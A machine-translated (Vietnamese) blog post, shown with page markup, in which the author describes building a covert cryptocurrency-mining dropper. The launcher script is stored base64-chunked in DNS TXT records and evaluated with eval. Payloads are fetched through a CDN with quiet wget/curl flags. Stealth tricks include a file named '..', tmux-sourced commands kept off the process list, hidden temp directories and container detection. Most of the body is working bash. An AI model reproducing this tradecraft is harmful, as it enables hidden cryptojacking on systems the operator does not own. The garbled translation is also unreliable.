both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><link href=https://www.unto.re/vi/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Biên niên sử của một giọt tiền điện tử</title><script type=application/ld+json>{"url":"/vi/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/vi/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-11-02T20:43:33.027","inLanguage":"vi","name":"","mainEntityOfPage":{"@id":"/vi/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/vi/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/vi/posts/><i class="fas fa-pen menu-icons"></i> bài viết</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/vi/media/><i class="fas fa-tv menu-icons"></i> phương tiện truyền thông</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/vi/posts/><i class="fas fa-pen menu-icons"></i> bài viết</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/vi/media/><i class="fas fa-tv menu-icons"></i> phương tiện truyền thông</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/vi/posts/chronichles_of_a_cryptonote_dropper> Biên niên sử của một giọt tiền điện tử</a></h1><blockquote id=page-description style=font-style:italic>... Bạn sẵn sàng đi bao xa cho ... xu?</blockquote></div><div class=franklin-content><p>Giả sử bạn muốn khai thác<a href=https://en.wikipedia.org/wiki/Cryptocurrency> tiền điện tử</a> trên điều khiển từ xa<em> ảo</em> phần cứng. Bạn cần tìm thứ gì đó để khai thác. Máy chủ từ xa có nghĩa là, không<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> hoặc các thuật toán bằng chứng công việc của GPU, về cơ bản chỉ<a href=\posts/a-few-notes-on-proof-of-work> Xu thân thiện với CPU</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Phần mềm</a></h2><p>Tìm kiếm và tìm một<a href=https://github.com/xmrig/xmrig> thợ mỏ</a> , nhưng nó không thực sự tốt, bạn muốn thứ gì đó bạn có thể điều khiển từ xa tốt hơn, vì vậy bạn thấy<a href=https://github.com/Bendr0id/xmrigCC> một thợ mỏ khác</a> . Bạn cũng muốn một<a href=https://github.com/Bendr0id/xmrigcc-proxy> Ủy quyền</a> , bởi vì nhiều kết nối sẽ tồn tại trong thời gian ngắn, bạn không muốn<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> nhóm khai thác của bạn. Vừa là<a href=https://github.com/search?q=tunnel> đường hầm</a> sẽ tốt.<h2 id=the_design><a class=header-anchor href=#the_design> Thiết kế</a></h2><p>Một số mạng botnet sử dụng dữ liệu chuỗi khối để tra cứu các lệnh,<a href=https://twitter.com/sarahjamielewis> có ai</a> cũng dường như có<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> cược thua</a> về điều này sẽ không xảy ra nữa ... dù sao thì chúng tôi cũng không phức tạp như vậy, chúng tôi sẽ sử dụng một số bản ghi DNS lưu trữ một tập lệnh kéo tải trọng tự giải nén trong thư mục tạm thời thực thi và rời khỏi<em> gần như</em> không có dấu vết của thiết lập của nó. Đây là một lưu đồ nhỏ mô tả cấu trúc<h2 id=launcher><a class=header-anchor href=#launcher> Trình khởi chạy</a></h2><p>Điểm mấu chốt của tập lệnh khởi động là có thể truy cập và cập nhật dễ dàng để nó chịu được thử thách của thời gian. Đang cập nhật<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> hồ sơ rất dễ dàng và DNS là thứ cuối cùng bị tắt trong mạng..vì địa chỉ IP rất khó nhớ ... nên rất có thể nó sẽ luôn có sẵn. Bạn thấy khi chúng tôi đang<em> tìm nạp tập lệnh triển khai</em>chúng tôi thực sự đang chạy một số logic, đây là tập lệnh trình khởi chạy, nó cần khả năng thực hiện các truy vấn DNS để tra cứu hồ sơ của chúng tôi, DNS có thể phổ biến nhưng<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> đào</a> không phải.<p>Có một chút câu hỏi hóc búa ở đây, nếu chúng ta phải tải xuống một công cụ khác<em> để tải xuống một tập lệnh khác để tải xuống tải trọng</em> chúng ta chỉ nên tải xuống tải trọng! Trong phòng thủ ... thực hiện điệu nhảy scripty này làm tăng thêm sự xáo trộn, cho phép chỉ giữ một lần triển khai trình khởi chạy (khả năng bảo trì, yay), hầu như không bắt buộc..vì vậy chúng tôi cũng phục vụ<a href=https://en.wikipedia.org/wiki/Standalone_program> liên kết tĩnh</a> tập tin thực thi đào để thực hiện các truy vấn dns, được tìm nạp bằng cách tự lưu trữ hoặc lưu trữ đám mây (vâng, có các dự phòng, như 3 hoặc 4, vì các dịch vụ đám mây có băng thông miễn phí rất tối thiểu và cũng yêu cầu cookie hoặc mã thông báo truy cập ... chúng rất kịch bản tất nhiên là không thân thiện, có chủ đích).<p>Có gì trong các bản ghi dns? Chúng tôi đang sử dụng<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> bản ghi, trên một miền tùy chỉnh (dự phòng cũng ở đây). Tại sao TXT? chúng tình cờ là những thứ có thể lưu trữ lượng dữ liệu lớn nhất..thông thường vì nó là loại<a href=https://www.ietf.org/rfc/rfc6763.txt> khuyến khích</a> phụ thuộc vào<em> đồ đạc</em> . Chúng tôi đặc biệt đang sử dụng<a href=https://www.cloudflare.com/> đám mây</a> đối với DNS của chúng tôi vì nó miễn phí và gần như là trình phát duy nhất trong thị trấn (<em> cũng không thực sự nhưng bất kỳ bảng màu thay thế nào khác đều có tính năng khôn ngoan</em> ). Điều xảy ra là bạn có thể lưu trữ nhiều phần dữ liệu trên<em> tương tự</em> ghi lại ... điều này bắt đầu trở nên khó hiểu và tranh giành một số thông số kỹ thuật ... (tiếp tuyến) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> đã từng</a> cho phép<em> bị xích</em>Các bản ghi TXT có tổng dung lượng ~ 9k byte, tài liệu hiện trạng thái ~ 2k byte, trước khi thay đổi, tôi nghĩ rằng tôi đang sử dụng ~ 6k và đang phân phát tập lệnh không nén, sau đó tôi phải làm mỏng tập lệnh và nén nó trước khi sử dụng (thực sự là tôi đã cố gắng sử dụng một<a href=https://freedns.afraid.org/> giải phóng</a> nhà cung cấp, tôi đã bị cấm trong vòng một ngày, đoán rằng họ có chính sách bản ghi TXT nghiêm ngặt không có chất béo), tuy nhiên nén gzip dường như KHÔNG thân thiện với đường ống và vẫn gây ra sự cố, vì vậy tôi phải xoay sở để nhồi nhét tập lệnh vào mà không nén ( tiếp tuyến cuối).<p>Làm thế nào để chúng tôi lưu trữ nó? Bản ghi TXT chỉ hỗ trợ chuỗi chữ và số, không<a href=https://en.wikipedia.org/wiki/Null_character> NULs</a> , vì vậy chúng tôi phải bọc nó thành một mã hóa không rỗng,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> thỏa mãn ràng buộc này và bởi vì chúng tôi đang lưu trữ<em> bị xích</em> Bản ghi TXT, chúng ta phải chia nhỏ đầu ra, vì chúng ta đang sử dụng công cụ shell, điều này được thực hiện thông qua<code>-w</code> cờ, trên busybox cờ như vậy đã từng vắng mặt (hoặc chọn tham gia) trên các phiên bản cũ hơn, điều này gây khó chịu, một giải pháp thay thế là sử dụng bộ mã hóa đi kèm với openssl,<code>openssl enc -base64</code>.<p>Bây giờ chúng tôi biết cách lưu trữ tập lệnh triển khai của mình, chúng tôi lưu trữ nó bằng<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> hoặc thủ công. Làm thế nào để chúng tôi kéo nó? Chúng tôi đã đề cập rằng chúng tôi cần các ràng buộc hoặc của riêng chúng tôi<code>dig</code> ... sau khi đã chọn điểm cuối phục vụ, chúng tôi muốn tải xuống, những gì có sẵn thường là<a href=https://www.gnu.org/software/wget/> wget</a> hoặc<a href=https://curl.se/> Xoăn</a> , wget được cài đặt sẵn thường xuyên hơn, tuy nhiên busybox chỉ cung cấp hỗ trợ tls với các thư viện động, vì vậy bạn phải đảm bảo rằng điểm cuối đang phân phát http hoặc tiện ích của bạn<code>wget</code> từ gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Nó có nghĩa là thử<code>-t2</code> thời gian chờ đợi<code>-T10</code> giây là<code>-q</code> đọc yên tĩnh từ<code>-i-</code> stdin (<code>$digurl</code> ) và viết thư cho<code>-O-</code> stdout (<code>$filename</code>). Lệnh này không tiết lộ những gì chúng tôi đang tải xuống ngay từ cái nhìn đầu tiên. Chúng tôi sẽ rất cẩn thận với các lệnh shell khác vì lý do tương tự hoặc dính với shell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bấu víu</a> ) tích hợp sẵn nếu có thể. Ngoài ra, hãy quan tâm đến nơi bạn đang tải xuống các tệp thực thi của mình, bạn muốn đảm bảo rằng bạn có thể thực thi chúng, vì một số điểm gắn kết, đặc biệt là trong các vùng chứa và<code>tmp</code> những con đường là<code>noexec</code> . Bây giờ chúng ta có công cụ truy vấn dns, chúng ta tìm nạp các bản ghi của mình<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Cờ tự giải thích ở đây,<code>+short</code> chỉ có nghĩa là chúng ta chỉ quan tâm đến bản thân dữ liệu, vì vậy chúng ta không phải phân tích cú pháp đầu ra. Điều quan trọng là chỉ định máy chủ DNS, như google (<code>8.8.8.8</code> ) hoặc cloudflare (<code>1.1.1.1</code> ) cái do nhiều môi trường chuyển hướng hoặc proxy dns truy vấn đến máy chủ dns của riêng chúng theo mặc định. Sau khi tìm nạp tập lệnh được phân khối, chúng tôi xử lý các dấu ngoặc kép và khoảng trắng để sẵn sàng giải mã<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Điều gì sẽ xảy ra nếu bây giờ chúng ta<em> vẫn còn</em> không có trình khởi chạy của chúng tôi? DNS rất lộn xộn, chúng tôi muốn có một dự phòng, hãy thiết lập một miền phụ để tìm nạp trực tiếp tập lệnh trình khởi chạy. Trước khi đánh giá tập lệnh của mình, chúng tôi muốn tùy chỉnh nó, với một số biến, một lần nữa cho phép sử dụng bản ghi TXT để lưu trữ danh sách NAME = VALUE các biến và phân tích cú pháp. Ngoài ra còn có dự phòng cho các biến, cloudflare cung cấp chuyển hướng dựa trên URL, những chuyển hướng này được phục vụ<em> trước</em> đích, vì vậy chúng tôi không cần một điểm cuối, chúng tôi chỉ muốn định cấu hình các quy tắc chuyển hướng dựa trên regex đến một điểm cuối giả tưởng, những gì chúng tôi quan tâm là các tham số của url<code>?NAME=VALUE&NAME2=VALUE2...</code>, để chúng tôi có thể tham số hóa trình khởi chạy của mình chỉ bằng cách thay đổi url chuyển hướng, luôn chú ý đến trích dẫn và thoát mã<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>The wget<code>-S</code> in url chuyển hướng mà chúng tôi quan tâm để phân tích cú pháp. Có các tham số và tập lệnh, chúng tôi đánh giá các biến ghi chúng trên một tệp<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Tệp này sẽ có nguồn gốc bởi là kịch bản triển khai. Phần cuối cùng của tập lệnh khởi động là thực tế<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> nhún nhảy</a> , đánh giá tập lệnh trong quy trình shell hiện tại hoặc có thể để nó được quản lý bởi tmux nếu có thể.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Tập lệnh trình khởi chạy được kết xuất vào một tệp có tên "..", điều này trông có vẻ khó hiểu vì nó có thể bị nhầm lẫn là<em> cha mẹ</em> danh mục. Và chúng tôi không bao gồm lệnh phiên, vì điều đó sẽ tồn tại trong lệnh tiến trình, thay vào đó chúng tôi bắt đầu phiên tmux trước và gửi lệnh nguồn thông qua giao diện đầu cuối tmux. Liên quan đến điều này, đôi khi gọi một tệp thực thi với<code>./</code> giữ các ký tự đó trong lệnh, vì vậy tốt hơn là thêm<code>$PWD</code> đến con đường ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Tải trọng</a></h2><p>Tập lệnh triển khai của chúng tôi bắt đầu bằng cách tìm nguồn cung cấp<code>env.sh</code> tệp và giữ hoặc cấu hình vars dưới dạng<code>STARTING_*</code> vars như<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Điều này cho phép chúng tôi giết và khởi động lại một phiên bản đang chạy trong khi thiết lập lại môi trường. Cho phép chuyển sang thư mục tmp với khả năng thực thi<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Kiểm tra xem trong một<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> thùng đựng hàng</a> cũng rất hữu ích, chúng tôi có thể thăm dò hệ thống tệp để biết gợi ý<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Bây giờ đã đến lúc tải xuống tải trọng của chúng tôi, chúng tôi chọn hỗ trợ cả wget và curl, chúng tôi đã biết cách sử dụng wget với các cờ cẩn thận, đối với curl thì hơi khác một chút. Chúng tôi phải tạo một tệp cấu hình và ghi đè<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Bước cuối cùng chỉ là giải nén tải trọng<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Điều đáng nói là sử dụng [CDN] để phục vụ tải trọng. Ở đây một lần nữa, cloudflare lại cứu giúp chúng ta khỏi chi phí băng thông. Chỉ cần đổi tên tải trọng đã nén của chúng tôi bằng<em> phần mở rộng tệp</em> được hỗ trợ bởi cloudflare ... nó sẽ được lưu vào bộ nhớ đệm. Cloudflare không kiểm tra tiêu đề của những gì nó đang phục vụ, có thể vì làm như vậy ở quy mô đó đơn giản là không thực tế.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Cuộc phiêu lưu xuống Bashland</a></h2><p>Bash được chọn với giả định là có thể di động, trông không quá lạc hậu và phổ biến hơn so với các ngôn ngữ kịch bản khác như perl, ruby ​​hoặc python. Sự thật là một bản nhị phân độc lập được viết bằng golang hoặc lua sẽ dễ dàng hơn nhiều, ít lỗi hơn và dễ bảo trì hơn, về cơ bản bash là lựa chọn tồi tệ nhất có thể, để phòng vệ cho tôi, vào thời điểm tôi gãi ngứa vì bash , đã quá muộn để viết lại, và nó cũng trở nên nhàm chán.<p>Ngoài ra còn có tùy chọn sử dụng busybox với cờ thời gian biên dịch để sử dụng tất cả các nội trang (như grep và sed), tuy nhiên sử dụng nội trang theo cách này không cho phép tạo ra các công việc (fork) và khiến daemon gặp các bế tắc tiềm ẩn.<p>Tôi sẽ mô tả một số hàm bash ở đây, với danh sách đầy đủ có sẵn<a href=\assets/posts/bash_functions.txt> ở đây</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Sử dụng<code>RANDOM</code> biến để nhận một số trong khoảng từ 97-122 tương ứng với mã ký tự, printf phải là một nội trang, chúng tôi không muốn rẽ nhánh trong một vòng lặp.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Tận dụng các đường ống để tạo các bộ mô tả tệp ẩn danh, chúng không hoạt động chính xác như các bộ mô tả tệp nhưng chúng đủ tốt để<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Ngủ mà không cần phân nhánh, bằng cách lạm dụng chức năng thời gian chờ của nội trang đọc, nó sử dụng trình mô tả tệp chuyên dụng và chúng tôi phải đảm bảo rằng nó có sẵn để tránh kết thúc.<p>Có các chức năng như<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> được sử dụng để giám sát việc sử dụng hệ thống, tất cả đều sử dụng linux<code>/proc</code> các tệp không có các công cụ như<code>ps</code> , vì vậy không có fork, tất cả đều là bash thuần túy.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
